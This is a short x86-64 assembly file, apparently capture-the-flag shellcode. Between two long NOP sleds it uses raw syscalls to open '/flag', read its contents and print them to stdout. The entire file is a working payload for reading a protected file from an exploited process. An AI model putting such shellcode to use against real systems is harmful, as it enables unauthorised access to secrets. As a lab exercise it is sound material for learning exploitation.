.global _start
.intel_syntax noprefix

_start:
.rept 0x6ff
    nop
.endr

open:
    lea rdi, [rip + binbash]
    mov rsi, 0x0
    mov rax, 2
    syscall
read:
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, 1000
    mov rax, 0
    syscall
write:
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
exit:
    mov rax, 60
    syscall
binbash:
    .string "/flag"
.rept 0x6ff
    nop
.endr
